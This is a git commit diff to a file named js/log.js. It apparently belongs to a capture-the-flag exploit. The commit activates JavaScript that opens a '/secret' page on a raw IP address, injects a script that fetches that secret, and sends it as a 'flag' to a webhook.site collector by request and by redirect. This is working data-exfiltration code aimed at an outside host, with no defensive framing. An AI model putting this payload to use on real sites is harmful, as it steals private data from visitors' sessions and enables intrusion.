f102e8e1969c508aebbc2013d744bc93ffcbcac5
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-16 21:05:23 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,5 +1,5 @@
-//let value = window.open('http://20.235.243.131:8443/secret');
-//window.onload=()=>{
-//    window.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag;})</script>');
-//}
-window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=$$$$$";
+let value = window.open('http://20.235.243.131:8443/secret');
+window.onload=()=>{
+    window.document.write('<script>fetch("/secret").then(data => data.text()).then(flag => {fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag;})</script>');
+}
+// window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?test=$$$$$";
